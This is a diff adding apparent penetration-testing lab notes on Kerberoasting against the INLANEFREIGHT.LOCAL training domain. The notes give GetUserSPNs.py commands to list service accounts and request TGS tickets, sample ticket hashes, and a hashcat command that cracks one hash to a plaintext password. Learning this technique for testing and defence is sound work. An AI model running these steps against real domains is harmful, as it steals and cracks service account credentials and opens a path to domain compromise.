@@ -1,0 +1,88 @@
+
+## GetUserSPNs.py
+
+### 1. List All SPN Accounts
+
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+```
+
+**Expected Output:**
+```
+Password:
+ServicePrincipalName                           Name               MemberOf                  PasswordLastSet             LastLogon
+---------------------------------------------  -----------------  ------------------------  --------------------------  ---------
+backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,...      2022-02-15 17:15:40.842452  <never>
+sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,...      2022-02-15 17:14:48.701834  <never>
+MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,...       2022-02-15 17:09:46.326865  <never>
+MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,...       2022-02-15 17:10:06.545598  <never>
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,...      2022-02-15 17:13:31.639334  <never>
+adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop  2022-02-15 17:15:27.108079  <never>
+```
+
+**Key Observations:**
+- Note accounts that are members of privileged groups (Domain Admins)
+- Check PasswordLastSet date - older passwords may be weaker
+- Accounts with never logged on may have default/weak passwords
+
+### 2. Fix Time Synchronization (if needed)
+
+Kerberos is time-sensitive. If you encounter errors, sync your time with the DC:
+
+```bash
+sudo ntpdate 172.16.5.5
+```
+
+### 3. Request TGS Tickets for All SPNs
+
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+```
+
+**Expected Output:**
+```
+Password:
+ServicePrincipalName                           Name               MemberOf
+---------------------------------------------  -----------------  ---------------------------------------------------
+$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$...$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b...
+$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$...$993de7a8296f2a3f2fa41badec4215e1$d0fb2166453e4f...
+<SNIP>
+```
+
+### 4. Request TGS Ticket for a Specific User
+
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+```
+
+**Expected Output:**
+```
+Password:
+ServicePrincipalName                           Name    MemberOf
+---------------------------------------------  ------  ---------------------------------------------------
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+
+$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b26032321529762c8a$1bdc5810b36c8e485ba08fcb7ab273f778115cd17734ec65be71f5b4bea4c0e63fa7bb454fdd5481e32f002abff9d1c7827fe3a75275f432ebb628a471d3be45898e7cb336404e8041d252d9e1ebef4dd3d249c4ad3f64efaafd06bd024678d4e6bdf582e59c5660fcf0b4b8db4e549cb0409ebfbd2d0c15f0693b4a8ddcab243010f3877d9542c790d2b795f5b9efbcfd2dd7504e7be5c2f6fb33ee36f3fe001618b971fc1a8331a1ec7b420dfe13f67ca7eb53a40b0c8b558f2213304135ad1c59969b3d97e652f55e6a73e262544fe581ddb71da060419b2f600e08dbcc21b57355ce47ca548a99e49dd68838c77a715083d6c26612d6c60d72e4d421bf39615c1f9cdb7659a865eecca9d9d0faf2b77e213771f1d923094ecab2246e9dd6e736f83b21ee6b352152f0b3bbfea024c3e4e5055e714945fe3412b51d3205104ba197037d44a0eb73e543eb719f12fd78033955df6f7ebead5854ded3c8ab76b412877a5be2e7c9412c25cf1dcb76d854809c52ef32841269064661931dca3c2ba8565702428375f754c7f2cada7c2b34bbe191d60d07111f303deb7be100c34c1c2c504e0016e085d49a70385b27d0341412de774018958652d80577409bff654c00ece80b7975b7b697366f8ae619888be243f0e3237b3bc2baca237fb96719d9bc1db2a59495e9d069b14e33815cafe8a8a794b88fb250ea24f4aa82e896b7a68ba3203735ec4bca937bceac61d31316a43a0f1c2ae3f48cbcbf294391378ffd872cf3721fe1b427db0ec33fd9e4dfe39c7cbed5d70b7960758a2d89668e7e855c3c493def6aba26e2846b98f65b798b3498af7f232024c119305292a31ae121a3472b0b2fcaa3062c3d93af234c9e24d605f155d8e14ac11bb8f810df400604c3788e3819b44e701f842c52ab302c7846d6dcb1c75b14e2c9fdc68a5deb5ce45ec9db7318a80de8463e18411425b43c7950475fb803ef5a56b3bb9c062fe90ad94c55cdde8ec06b2e5d7c64538f9c0c598b7f4c3810ddb574f689563db9591da93c879f5f7035f4ff5a6498ead489fa7b8b1a424cc37f8e86c7de54bdad6544ccd6163e650a5043819528f38d64409cb1cfa0aeb692bdf3a130c9717429a49fff757c713ec2901d674f80269454e390ea27b8230dec7fffb032217955984274324a3fb423fb05d3461f17200dbef0a51780d31ef4586b51f130c864db79796d75632e539f1118318db92ab54b61fc468eb626beaa7869661bf11f0c3a501512a94904c596652f6457a240a3f8ff2d8171465079492e93659ec80e2027d6b1865f436a443b4c16b5771059ba9b2c91e871ad7baa5355d5e580a8ef05bac02cf135813b42a1e172f873bb4ded2e95faa6990ce92724bcfea6661b592539cd9791833a83e6116cb0ea4b6db3b161ac7e7b425d0c249b3538515ccfb3a993affbd2e9d247f317b326ebca20fe6b7324ffe311f225900e14c62eb34d9654bb81990aa1bf626dec7e26ee2379ab2f30d14b8a98729be261a5977fefdcaaa3139d4b82a056322913e7114bc133a6fc9cd74b96d4d6a2
+```
+## Crack the TGS Ticket with Hashcat
+
+### 5. Crack the Ticket
+
+```bash
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
+```
+
+**Expected Output:**
+```
+$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$...:database!
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, TGS-REP
+Hash.Target......:$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$... 
+Recovered........: 1/1 (100.00%) Digests
+```
+
+**Hashcat Mode Reference:**
+- `13100` - Kerberos 5 TGS-REP etype 23 (RC4)
+- `19600` - Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96)
+- `19700` - Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)
